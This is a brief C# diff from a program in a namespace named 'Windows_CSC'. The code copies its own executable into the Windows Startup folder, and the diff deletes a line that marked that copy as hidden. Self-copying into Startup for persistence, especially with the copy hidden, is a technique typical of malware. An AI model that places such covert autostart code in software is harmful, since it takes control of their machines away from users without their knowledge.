@@ -55,7 +55,6 @@ namespace Windows_CSC
                 if (!System.IO.File.Exists(path + "Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + Application.ProductName + ".exe"))
                 {
                     System.IO.File.Copy(Assembly.GetExecutingAssembly().Location, path + "Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + Application.ProductName + ".exe");
-                    System.IO.File.SetAttributes(path + "Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + Application.ProductName + ".exe", System.IO.FileAttributes.Hidden);
                 }
             }
             catch
